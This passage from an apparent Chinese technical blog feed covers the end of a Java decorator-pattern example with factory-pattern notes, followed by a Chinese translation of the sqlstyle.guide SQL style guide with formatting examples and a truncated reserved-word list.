Mocha&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">.20</span> + beverage.cost();    &#125;&#125;language-Java</code></pre><hr><ol><li>测试代码</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StarbuzzCoffee</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">// 没有配料的拿铁咖啡</span>        <span class="hljs-type">Beverage</span> <span class="hljs-variable">beverage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DarkRoast</span>();        System.out.println(beverage.getDescription() + <span class="hljs-string">&quot; $&quot;</span> + beverage.cost());        <span class="hljs-comment">// 摩卡， 牛奶， 拿铁咖啡(DarkRoast)</span>        <span class="hljs-type">Beverage</span> <span class="hljs-variable">beverage2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DarkRoast</span>();        beverage2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mocha</span>(beverage2);        beverage2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Milk</span>(beverage2);        System.out.println(beverage2.getDescription() + <span class="hljs-string">&quot; $&quot;</span> + beverage2.cost());    &#125;&#125;language-Java</code></pre><hr><ol><li>运行结果</li></ol><pre><code class="hljs bash">java StarbuzzCoffeeDarkRoast Coffee <span class="hljs-variable">$1</span>.19DarkRoast Coffee, Mocha, Milk <span class="hljs-variable">$1</span>.49</code></pre><hr><h2 id="第四招-工厂模式"><a href="#第四招-工厂模式" class="headerlink" title="第四招 工厂模式"></a>第四招 工厂模式</h2><p><strong>工厂方法模式</strong>：定义了一个创建对象的接口，但由子类决定要实例化的类是哪一个。工厂方法让类把实例化推迟到子类。</p><h3 id="4-1设计原则"><a href="#4-1设计原则" class="headerlink" title="4.1设计原则"></a>4.1设计原则</h3><ol><li>多用组合，少用继承</li><li>针对接口编程，不针对实现编程</li><li>为交互对象之间的松耦合设计而努力</li><li>类应该对扩展开放，对修改关闭</li><li>依赖抽象，不要依赖具体类。</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/2021/03/22/SQL/"/>
      <url>/2021/03/22/SQL/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-style-guide-SQL-样式指南"><a href="#SQL-style-guide-SQL-样式指南" class="headerlink" title="SQL style guide SQL 样式指南"></a>SQL style guide SQL 样式指南</h1><p>这篇文档翻译自以<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh">署名-相同方式共享 4.0 国际协议</a>发布的 <a href="http://www.sqlstyle.guide/">http://www.sqlstyle.guide</a>，译文以与原文同样的协议发布。</p><h2 id="Overview-综述"><a href="#Overview-综述" class="headerlink" title="Overview 综述"></a>Overview 综述</h2><p>你可以直接使用这些指导方针，或者 <a href="https://github.com/treffynnon/sqlstyle.guide/fork">fork</a> 后创建自己的版本 —— 最重要的是选择一套方针并严格遵守它。欢迎通过在 GitHub 上提交 <a href="https://github.com/treffynnon/sqlstyle.guide/issues">issue</a> 或 <a href="https://github.com/treffynnon/sqlstyle.guide/pulls/">pull request</a> 来提交建议或修复 bug。</p><p>为了让阅读了 Joe Celko 的《<a href="https://www.amazon.com/gp/product/0120887975/ref=as_li_ss_tl?ie=UTF8&linkCode=ll1&tag=treffynnon-20&linkId=9c88eac8cd420e979675c815771313d5">SQL ProgrammingStyle</a>》的团队能更容易采用这套规则，这套原则被设计成与该书兼容的形式。本指南在某些领域严一些，在另一些领域松一些。当然本指南比 Celko 的书更简洁一些 —— 因为 Celko 的书包含了一些趣闻和每一条原则后的理由。</p><p>将该文档的 <a href="https://raw.githubusercontent.com/treffynnon/sqlstyle.guide/gh-pages/_includes/sqlstyle.guide.zh.md">Markdown 格式</a> 添加到项目代码库中或将该页面的链接发送给项目的所有参与者要比传阅实体书容易得多。</p><p><a href="https://www.simonholywell.com/?utm_source=sqlstyle.guide&utm_medium=link&utm_campaign=md-document">Simon Holywell</a> 所著的《SQL 样式指南》以<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh">署名-相同方式共享 4.0 国际协议</a>发布，改编自 <a href="http://www.sqlstyle.guide/">http://www.sqlstyle.guide</a>。</p><h2 id="General-一般原则"><a href="#General-一般原则" class="headerlink" title="General 一般原则"></a>General 一般原则</h2><h3 id="Do-应该做的事情"><a href="#Do-应该做的事情" class="headerlink" title="Do 应该做的事情"></a>Do 应该做的事情</h3><ul><li>使用一致的、描述性的名称。</li><li>合理地使用空格和缩进来增强可读性。</li><li>存储符合 <a href="https://en.wikipedia.org/wiki/ISO_8601">ISO-8601</a> 标准的日期格式（<code>YYYY-MM-DD HH:MM:SS.SSSSS</code>）。</li><li>为了提高可移植性，最好仅使用标准 SQL 函数而不是特定供应商的函数。</li><li>保证代码简洁明了、没有多余的 SQL —— 比如非必要的引号或括号，或者可以推导出的 <code>WHERE</code> 子句。</li><li>必要时在 SQL 代码中加入注释。优先使用 C 语言式的以 <code>/*</code> 开始以 <code>*/</code> 结束的块注释，或使用以 <code>--</code> 开始的行注释，并在末尾换行。</li></ul><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> file_hash  <span class="hljs-comment">-- stored ssdeep hash</span>  <span class="hljs-keyword">FROM</span> file_system <span class="hljs-keyword">WHERE</span> file_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;.vimrc&#x27;</span>;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码<span class="hljs-comment">/* Updating the file record after writing to the file */</span><span class="hljs-keyword">UPDATE</span> file_system   <span class="hljs-keyword">SET</span> file_modified_date <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1980-02-22 13:19:01.00000&#x27;</span>,       file_size <span class="hljs-operator">=</span> <span class="hljs-number">209732</span> <span class="hljs-keyword">WHERE</span> file_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;.vimrc&#x27;</span>;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h3 id="Avoid-应避免的事情"><a href="#Avoid-应避免的事情" class="headerlink" title="Avoid 应避免的事情"></a>Avoid 应避免的事情</h3><ul><li>驼峰命名法 —— 它不适合快速扫读。</li><li>描述性的前缀或匈牙利命名法比如 <code>sp_</code> 或 <code>tbl</code>。</li><li>复数形式 —— 尽量使用更自然的集合术语。比如，用“staff”替代“employees”，或用“people”替代“individuals”。</li><li>被引号包裹的标识符（quoted identifier）—— 如果你必须使用这样的标识符，最好坚持用 SQL92 的双引号来提高可移植性（你可能需要配置你的 SQL 服务器以支持此特性，具体取决于供应商）。</li><li>面向对象编程的原则不该应用到 SQL 或数据库结构上。</li></ul><h2 id="Naming-conventions-命名惯例"><a href="#Naming-conventions-命名惯例" class="headerlink" title="Naming conventions 命名惯例"></a>Naming conventions 命名惯例</h2><h3 id="General-一般原则-1"><a href="#General-一般原则-1" class="headerlink" title="General 一般原则"></a>General 一般原则</h3><ul><li>保证名字独一无二且不是<a href="https://hjxstart.github.io/2021/03/22/SQL/#%E4%BF%9D%E7%95%99%E5%AD%97%E5%8F%82%E8%80%83">保留字</a>。</li><li>保证名字长度不超过 30 个字节 —— 实际上，如果你不使用多字节字符集，就是 30 个字符。</li><li>名字要以字母开头，不能以下划线结尾。</li><li>只在名字中使用字母、数字和下划线。</li><li>不要在名字中出现连续下划线 —— 这样很难辨认。</li><li>在名字中需要空格的地方用下划线代替（<code>first name</code> 变为 <code>first_name</code>）。</li><li>尽量避免使用缩写词。使用时一定确定这个缩写简明易懂。</li></ul><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name  <span class="hljs-keyword">FROM</span> staff;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h3 id="Tables-表名"><a href="#Tables-表名" class="headerlink" title="Tables 表名"></a>Tables 表名</h3><ul><li>使用集合名称，或在不那么理想的情况下使用复数形式。如 <code>staff</code>（建议使用）和 <code>employees</code>。</li><li>不要使用类似 <code>tbl</code> 或其他的描述性的前缀或匈牙利命名法。</li><li>表不应该同它的列同名，反之亦然。</li><li>尽量避免连接两个表的名字作为关系表（relationship table）的名字。与其使用 <code>cars_mechanics</code> 做表名不如使用 <code>services</code>。</li></ul><h3 id="Columns-列名"><a href="#Columns-列名" class="headerlink" title="Columns 列名"></a>Columns 列名</h3><ul><li>总是使用单数形式。</li><li>避免直接使用 <code>id</code> 做表的主标识符。</li><li>避免列名和表名同名，反之亦然。</li><li>总是使用小写字母，除非是特殊情况，如专有名词。</li></ul><h3 id="Aliasing-or-correlations-别名与关联名"><a href="#Aliasing-or-correlations-别名与关联名" class="headerlink" title="Aliasing or correlations 别名与关联名"></a>Aliasing or correlations 别名与关联名</h3><ul><li>别名应该与它们所指的对象或表达式相关联。</li><li>一般来说，关联名应该由对象名中每一个单词的首字母组成。</li><li>如果已经有相同的关联名了，那么在关联名后加一个数字。</li><li>总是加上 <code>AS</code> 关键字，因为这样的明确声明易于阅读。</li><li>为计算出的数据（<code>SUM()</code> 或 <code>AVG()</code>）命名时，用一个将这条数据存在表中时会使用的列名。</li></ul><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">AS</span> fn  <span class="hljs-keyword">FROM</span> staff <span class="hljs-keyword">AS</span> s1  <span class="hljs-keyword">JOIN</span> students <span class="hljs-keyword">AS</span> s2    <span class="hljs-keyword">ON</span> s2.mentor_id <span class="hljs-operator">=</span> s1.staff_num;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(s.monitor_tally) <span class="hljs-keyword">AS</span> monitor_total  <span class="hljs-keyword">FROM</span> staff <span class="hljs-keyword">AS</span> s;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h3 id="Stored-procedures-存储过程名"><a href="#Stored-procedures-存储过程名" class="headerlink" title="Stored procedures 存储过程名"></a>Stored procedures 存储过程名</h3><ul><li>名字一定要包含动词。</li><li>不要附加 <code>sp_</code> 或任何其他这样的描述性的前缀或使用匈牙利表示法。</li></ul><h3 id="Uniform-suffix-统一的后缀"><a href="#Uniform-suffix-统一的后缀" class="headerlink" title="Uniform suffix 统一的后缀"></a>Uniform suffix 统一的后缀</h3><p>下列后缀有统一的意义，能保证 SQL 代码更容易理解。在合适的时候使用正确的后缀。</p><ul><li><code>_id</code> —— 独一无二的标识符，如主键。</li><li><code>_status</code> —— 标志值或任何表示状态的值，比如 <code>publication_status</code>。</li><li><code>_total</code> —— 总和或某些值的和。</li><li><code>_num</code> —— 表示该字段包含数值。</li><li><code>_name</code> —— 表示名字，例如 <code>first_name</code>。</li><li><code>_seq</code> —— 包含一系列值。</li><li><code>_date</code> —— 表示该列包含日期。</li><li><code>_tally</code> —— 计数值。</li><li><code>_size</code> —— 大小，如文件大小或服装大小。</li><li><code>_addr</code> —— 地址，有形的或无形的，如 <code>ip_addr</code></li></ul><h2 id="Query-syntax-查询语句"><a href="#Query-syntax-查询语句" class="headerlink" title="Query syntax 查询语句"></a>Query syntax 查询语句</h2><h3 id="Reserved-words-保留字"><a href="#Reserved-words-保留字" class="headerlink" title="Reserved words 保留字"></a>Reserved words 保留字</h3><p>关键字总是大写，如 <code>SELECT</code> 和 <code>WHERE</code>。</p><p>最好使用关键字的全称而不是简写，用 <code>ABSOLUTE</code> 而不用 <code>ABS</code>。</p><p>当标准 ANSI SQL 关键字能完成相同的事情时，不要使用数据库服务器特定的关键字，这样能增强可移植性。</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> model_num  <span class="hljs-keyword">FROM</span> phones <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">WHERE</span> p.release_date <span class="hljs-operator">&gt;</span> <span class="hljs-string">&#x27;2014-09-30&#x27;</span>;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h3 id="White-space-空白字符"><a href="#White-space-空白字符" class="headerlink" title="White space 空白字符"></a>White space 空白字符</h3><p>正确地使用空白字符对清晰的代码十分重要。不要把代码堆在一起或移除自然语言中的空格。</p><h4 id="Spaces-空格"><a href="#Spaces-空格" class="headerlink" title="Spaces 空格"></a>Spaces 空格</h4><p>用空格使根关键字都结束在同一列上。在代码中间形成一个从上到下的“川流”，这样帮助读者快速扫视代码并将关键字和实现细节分开。川流在排版时应该避免，但是对阅读 SQL 语句是有帮助的。</p><pre><code class="hljs sql">(<span class="hljs-keyword">SELECT</span> f.species_name,        <span class="hljs-built_in">AVG</span>(f.height) <span class="hljs-keyword">AS</span> average_height, <span class="hljs-built_in">AVG</span>(f.diameter) <span class="hljs-keyword">AS</span> average_diameter   <span class="hljs-keyword">FROM</span> flora <span class="hljs-keyword">AS</span> f  <span class="hljs-keyword">WHERE</span> f.species_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Banksia&#x27;</span>     <span class="hljs-keyword">OR</span> f.species_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Sheoak&#x27;</span>     <span class="hljs-keyword">OR</span> f.species_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Wattle&#x27;</span>  <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> f.species_name, f.observation_date)  <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>(<span class="hljs-keyword">SELECT</span> b.species_name,        <span class="hljs-built_in">AVG</span>(b.height) <span class="hljs-keyword">AS</span> average_height, <span class="hljs-built_in">AVG</span>(b.diameter) <span class="hljs-keyword">AS</span> average_diameter   <span class="hljs-keyword">FROM</span> botanic_garden_flora <span class="hljs-keyword">AS</span> b  <span class="hljs-keyword">WHERE</span> b.species_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Banksia&#x27;</span>     <span class="hljs-keyword">OR</span> b.species_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Sheoak&#x27;</span>     <span class="hljs-keyword">OR</span> b.species_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Wattle&#x27;</span>  <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> b.species_name, b.observation_date);<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><p>注意 <code>SELECT</code> 和 <code>FROM</code> 等关键字，都右对齐，而实际的列名和实现细节都左对齐。</p><p>注意下列情况总是加入空格：</p><ul><li>在等号（<code>=</code>）前后</li><li>在逗号（<code>,</code>）后</li><li>成对的单引号（<code>&#39;</code>）前后，除非在括号中或后面是逗号 &#x2F; 分号</li></ul><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.title, a.release_date, a.recording_date  <span class="hljs-keyword">FROM</span> albums <span class="hljs-keyword">AS</span> a <span class="hljs-keyword">WHERE</span> a.title <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Charcoal Lane&#x27;</span>    <span class="hljs-keyword">OR</span> a.title <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;The New Danger&#x27;</span>;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h4 id="Line-spacing-换行"><a href="#Line-spacing-换行" class="headerlink" title="Line spacing 换行"></a>Line spacing 换行</h4><p>总是换行的情况：</p><ul><li>在 <code>AND</code> 或 <code>OR</code> 前</li><li>在分号后（分隔语句以提高可读性）</li><li>在每个关键字定义之后</li><li>将多个列组成一个逻辑组时的逗号后</li><li>将代码分隔成相关联的多个部分，帮助提高大段代码的可读性</li></ul><p>让所有的关键字右对齐、所有的值左对齐，这样就能在查询语句中间留出一个空隙，有助于快速扫读整个查询的定义。</p><pre><code class="hljs sql"><span class="hljs-keyword">INSERT INTO</span> albums (title, release_date, recording_date)<span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;Charcoal Lane&#x27;</span>, <span class="hljs-string">&#x27;1990-01-01 01:01:01.00000&#x27;</span>, <span class="hljs-string">&#x27;1990-01-01 01:01:01.00000&#x27;</span>),       (<span class="hljs-string">&#x27;The New Danger&#x27;</span>, <span class="hljs-string">&#x27;2008-01-01 01:01:01.00000&#x27;</span>, <span class="hljs-string">&#x27;1990-01-01 01:01:01.00000&#x27;</span>);<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码<span class="hljs-keyword">UPDATE</span> albums   <span class="hljs-keyword">SET</span> release_date <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1990-01-01 01:01:01.00000&#x27;</span> <span class="hljs-keyword">WHERE</span> title <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;The New Danger&#x27;</span>;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码<span class="hljs-keyword">SELECT</span> a.title,       a.release_date, a.recording_date, a.production_date <span class="hljs-comment">-- 将所有的日期放在一起</span>  <span class="hljs-keyword">FROM</span> albums <span class="hljs-keyword">AS</span> a <span class="hljs-keyword">WHERE</span> a.title <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Charcoal Lane&#x27;</span>    <span class="hljs-keyword">OR</span> a.title <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;The New Danger&#x27;</span>;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h3 id="Indentation-缩进"><a href="#Indentation-缩进" class="headerlink" title="Indentation 缩进"></a>Indentation 缩进</h3><p>为确保 SQL 的可读性，一定要遵守下列规则。</p><h4 id="Joins-Join-语句"><a href="#Joins-Join-语句" class="headerlink" title="Joins Join 语句"></a>Joins Join 语句</h4><p>Join 语句应该缩进到川流的另一侧并在必要的时候添加一个换行。</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> r.last_name  <span class="hljs-keyword">FROM</span> riders <span class="hljs-keyword">AS</span> r       <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> bikes <span class="hljs-keyword">AS</span> b       <span class="hljs-keyword">ON</span> r.bike_vin_num <span class="hljs-operator">=</span> b.vin_num          <span class="hljs-keyword">AND</span> b.engine_tally <span class="hljs-operator">&gt;</span> <span class="hljs-number">2</span>       <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> crew <span class="hljs-keyword">AS</span> c       <span class="hljs-keyword">ON</span> r.crew_chief_last_name <span class="hljs-operator">=</span> c.last_name          <span class="hljs-keyword">AND</span> c.chief <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Y&#x27;</span>;<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h4 id="Subqueries-子查询"><a href="#Subqueries-子查询" class="headerlink" title="Subqueries 子查询"></a>Subqueries 子查询</h4><p>子查询应该在川流的右侧对齐并使用其他查询相同的样式。有时候将右括号单独置于一行并同与它配对的左括号对齐是有意义的 —— 尤其是当存在嵌套子查询的时候。</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> r.last_name,       (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(<span class="hljs-keyword">YEAR</span>(championship_date))          <span class="hljs-keyword">FROM</span> champions <span class="hljs-keyword">AS</span> c         <span class="hljs-keyword">WHERE</span> c.last_name <span class="hljs-operator">=</span> r.last_name           <span class="hljs-keyword">AND</span> c.confirmed <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Y&#x27;</span>) <span class="hljs-keyword">AS</span> last_championship_year  <span class="hljs-keyword">FROM</span> riders <span class="hljs-keyword">AS</span> r <span class="hljs-keyword">WHERE</span> r.last_name <span class="hljs-keyword">IN</span>       (<span class="hljs-keyword">SELECT</span> c.last_name          <span class="hljs-keyword">FROM</span> champions <span class="hljs-keyword">AS</span> c         <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">YEAR</span>(championship_date) <span class="hljs-operator">&gt;</span> <span class="hljs-string">&#x27;2008&#x27;</span>           <span class="hljs-keyword">AND</span> c.confirmed <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Y&#x27;</span>);<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h3 id="Preferred-formalisms-推荐的形式"><a href="#Preferred-formalisms-推荐的形式" class="headerlink" title="Preferred formalisms 推荐的形式"></a>Preferred formalisms 推荐的形式</h3><ul><li>尽量使用 <code>BETWEEN</code> 而不是多个 <code>AND</code> 语句。</li><li>同样地，使用 <code>IN()</code> 而不是多个 <code>OR</code> 语句。</li><li>当数据输出数据库时需要处理时，使用 <code>CASE</code> 表达式。<code>CASE</code> 语句能嵌套形成更复杂的逻辑结构。</li><li>尽量避免 <code>UNION</code> 语句和临时表。如果数据库架构能够不靠这些语句运行，那么多数情况下它就不应该依靠这些语句。</li></ul><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> postcode       <span class="hljs-keyword">WHEN</span> <span class="hljs-string">&#x27;BN1&#x27;</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">&#x27;Brighton&#x27;</span>       <span class="hljs-keyword">WHEN</span> <span class="hljs-string">&#x27;EH1&#x27;</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">&#x27;Edinburgh&#x27;</span>       <span class="hljs-keyword">END</span> <span class="hljs-keyword">AS</span> city  <span class="hljs-keyword">FROM</span> office_locations <span class="hljs-keyword">WHERE</span> country <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;United Kingdom&#x27;</span>   <span class="hljs-keyword">AND</span> opening_time <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">8</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">9</span>   <span class="hljs-keyword">AND</span> postcode <span class="hljs-keyword">IN</span> (<span class="hljs-string">&#x27;EH1&#x27;</span>, <span class="hljs-string">&#x27;BN1&#x27;</span>, <span class="hljs-string">&#x27;NN1&#x27;</span>, <span class="hljs-string">&#x27;KW1&#x27;</span>);<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h2 id="Create-syntax-创建语句"><a href="#Create-syntax-创建语句" class="headerlink" title="Create syntax 创建语句"></a>Create syntax 创建语句</h2><p>声明模式信息时维护可读代码也很重要。所以列定义的顺序和分组一定要有意义。</p><p>在 <code>CREATE</code> 定义中，每个列定义要缩进 4 个空格。</p><h3 id="Choosing-data-types-选择数据类型"><a href="#Choosing-data-types-选择数据类型" class="headerlink" title="Choosing data types 选择数据类型"></a>Choosing data types 选择数据类型</h3><ul><li>尽量不使用供应商相关的数据类型 —— 这些类型不可移植甚至有可能不能在相同供应商的旧版本系统上使用。</li><li>只在真的需要浮点数运算的时候才使用 <code>REAL</code> 和 <code>FLOAT</code> 类型，否则使用 <code>NUMERIC</code> 和 <code>DECIMAL</code> 类型。浮点数舍入误差是个麻烦。</li></ul><h3 id="Specifying-default-values-指定默认类型"><a href="#Specifying-default-values-指定默认类型" class="headerlink" title="Specifying default values 指定默认类型"></a>Specifying default values 指定默认类型</h3><ul><li>默认值一定与列的类型相同 —— 如果一个列的类型是 <code>DECIMAL</code> 那么就不要使用 <code>INTEGER</code> 类型的值作为默认值。</li><li>默认值要紧跟类型声明并在 <code>NOT NULL</code> 声明前。</li></ul><h3 id="Constraints-and-keys-约束和键"><a href="#Constraints-and-keys-约束和键" class="headerlink" title="Constraints and keys 约束和键"></a>Constraints and keys 约束和键</h3><p>约束和键是构成数据库系统的重要组成部分。它们能很快地变得难以阅读和理解，所以遵从指导方针是很重要的。</p><h4 id="Choosing-keys-选择键"><a href="#Choosing-keys-选择键" class="headerlink" title="Choosing keys 选择键"></a>Choosing keys 选择键</h4><p>设计时应该谨慎选择构成键的列，因为键会影响性能和数据完整性。</p><ol><li>键在某种程度上应该是独一无二的。</li><li>该值在不同表中的类型应该相同并且尽量不会更改。</li><li>该值能否通过某种标准格式（如 ISO 发布的标准）？鼓励与前面第二点一致。</li><li>尽量让键保持简单，但在适当情况下不要害怕使用复合键。</li></ol><p>以上是定义数据库时合乎逻辑的平衡做法。当需求变更时，键也应该根据情况更新。</p><h4 id="Defining-constraints-定义约束"><a href="#Defining-constraints-定义约束" class="headerlink" title="Defining constraints 定义约束"></a>Defining constraints 定义约束</h4><p>确定键后，就可以用约束和字值段验证来定义它们。</p><h5 id="General-概述"><a href="#General-概述" class="headerlink" title="General 概述"></a>General 概述</h5><ul><li>表至少需要一个键来保证其完整性和可用性。</li><li>除了 <code>UNIQUE</code> 、<code>PRIMARY KEY</code> 和 <code>FOREIGN KEY</code> 之外（数据库供应商会提供相应的检查），约束应该有名字。</li></ul><h5 id="Layout-and-order-布局和顺序"><a href="#Layout-and-order-布局和顺序" class="headerlink" title="Layout and order 布局和顺序"></a>Layout and order 布局和顺序</h5><ul><li>在 <code>CREATE TABLE</code> 语句后先定义主键。</li><li>约束的定义应该紧跟它相应的列的定义后。</li><li>如果该约束与多个列相关，那么让它离相关的列越近越好。实在不行就将它放在表定义的最后。</li><li>如果是应用于整个表的表级别的约束，那么就将它放在表定义的最后。</li><li>按照字母顺序安排定义，<code>ON DELETE</code> 排在 <code>ON UPDATE</code> 前。</li><li>有道理的话，把所有相关的语句对齐。比如，把所有 <code>NOT NULL</code> 定义对齐到同一列。这样做并不难，但是能提高可读性。</li></ul><h5 id="Validation-校验"><a href="#Validation-校验" class="headerlink" title="Validation 校验"></a>Validation 校验</h5><ul><li>当字符串的格式已知时，用 <code>LIKE</code> 和 <code>SIMILAR TO</code> 约束来保证它们的完整性。</li><li>当数值的范围可以确定时，用范围 <code>CHECK()</code> 来防止错误的值进入数据库或在没有提示的情况下截断。大部分情况下至少要确认数值大于零。</li><li><code>CHECK()</code> 约束应该在单独的子句中以便 debug。</li></ul><h5 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h5><pre><code class="hljs sql"><span class="hljs-keyword">CREATE TABLE</span> staff (    <span class="hljs-keyword">PRIMARY KEY</span> (staff_num),    staff_num      <span class="hljs-type">INT</span>(<span class="hljs-number">5</span>)       <span class="hljs-keyword">NOT NULL</span>,    first_name     <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT NULL</span>,    pens_in_drawer <span class="hljs-type">INT</span>(<span class="hljs-number">2</span>)       <span class="hljs-keyword">NOT NULL</span>,                   <span class="hljs-keyword">CONSTRAINT</span> pens_in_drawer_range                   <span class="hljs-keyword">CHECK</span>(pens_in_drawer <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">99</span>));<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h3 id="Design-to-avoid-应该避免的设计"><a href="#Design-to-avoid-应该避免的设计" class="headerlink" title="Design to avoid 应该避免的设计"></a>Design to avoid 应该避免的设计</h3><ul><li>在关系型数据库的设计中应用面向对象设计思想（原则）—— 面向对象设计思想（原则）并不能很好地适用于关系型数据库的设计，避免这个陷阱。</li><li>将值存入一列并将其单位存在另一列 —— 列的定义应该让自己的单位不言自明以避免在应用内进行合并。使用 <code>CHECK()</code> 来保证插入的数据是合法的。</li><li><a href="https://en.wikipedia.org/wiki/Entity%E2%80%93attribute%E2%80%93value_model">EAV (Entity Attribute Value)</a> 表 —— 应该用专门的产品来处理这样的无模式数据。</li><li>因为某些原因（如为了根据时间归档、为了划分跨国组织的区域）将本应该放在一个表中的数据分到多个表中 —— 这样的设计导致以后必须使用 <code>UNION</code> 操作而不能直接查询一个表。</li></ul><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="保留字参考"><a href="#保留字参考" class="headerlink" title="保留字参考"></a>保留字参考</h3><p>下表包含了 ANSI SQL（92，99 和 2003)、MySQL 3 到 5.x、PostgreSQL 8.1、MS SQL Server 2000、MS ODBC 和 Oracle 10.2 中的关键字。</p><pre><code class="hljs sql">AABORTABSABSOLUTEACCESSACTIONADA<span class="hljs-keyword">ADD</span>ADMINAFTERAGGREGATEALIAS<span class="hljs-keyword">ALL</span><span class="hljs-keyword">ALLOCATE</span>ALSO<span class="hljs-keyword">ALTER</span>ALWAYSANALYSEANALYZE<span class="hljs-keyword">AND</span><span class="hljs-keyword">ANY</span><span class="hljs-keyword">ARE</span><span class="hljs-keyword">ARRAY</span><span class="hljs-keyword">AS</span><span class="hljs-keyword">ASC</span><span class="hljs-keyword">ASENSITIVE</span>ASSERTIONASSIGNMENT<span class="hljs-keyword">ASYMMETRIC</span><span class="hljs-keyword">AT</span><span class="hljs-keyword">ATOMIC</span>ATTRIBUTEATTRIBUTESAUDIT<span class="hljs-keyword">AUTHORIZATION</span>AUTO_INCREMENTAVGAVG_ROW_LENGTHBACKUPBACKWARDBEFORE<span class="hljs-keyword">BEGIN</span>BERNOULLI<span class="hljs-keyword">BETWEEN</span><span class="hljs-type">BIGINT</span><span class="hljs-type">BINARY</span>BITBIT_LENGTHBITVAR<span class="hljs-type">BLOB</span>BOOL<span class="hljs-type">BOOLEAN</span><span class="hljs-keyword">BOTH</span>BREADTHBREAKBROWSEBULK<span 